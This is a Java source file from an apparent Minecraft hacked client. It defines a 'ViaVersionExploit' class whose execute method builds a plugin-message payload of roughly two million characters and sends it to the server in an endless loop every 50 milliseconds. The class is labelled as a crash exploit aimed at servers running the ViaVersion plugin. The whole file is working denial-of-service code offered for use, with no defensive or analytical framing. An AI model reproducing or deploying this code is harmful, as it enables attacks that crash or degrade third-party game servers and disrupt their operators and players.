package net.paradise_client.exploit.impl;

import net.minecraft.client.MinecraftClient;
import net.minecraft.util.Identifier;
import net.paradise_client.Helper;
import net.paradise_client.exploit.Exploit;

import java.util.ArrayList;

public class ViaVersionExploit extends Exploit {
  public ViaVersionExploit(MinecraftClient client) {
    super("viaversion", "ViaVersion logs fucker", client);
  }

  @Override public void execute() {
    Helper.printChatMessage("Executing ViaVersion exploit!");
    new Thread(() -> {
      Helper.printChatMessage("Preparing payload!");
      ArrayList<Identifier> list = new ArrayList<>();
      list.add(Identifier.of("a".repeat(2097122)));


      Helper.printChatMessage("Payload prepared!");
      Helper.printChatMessage("Sending payload packets!");
      while (true) {
        Helper.sendPluginMessage("register:register",
          out -> list.forEach(identifier -> out.writeUTF(identifier.toString())));

        try {
          Thread.sleep(50);
        } catch (InterruptedException e) {
          Helper.printChatMessage("[CrashExploit] [ViaVersion] Unable to sleep 50ms");
        }
      }
    }).start();
  }
}
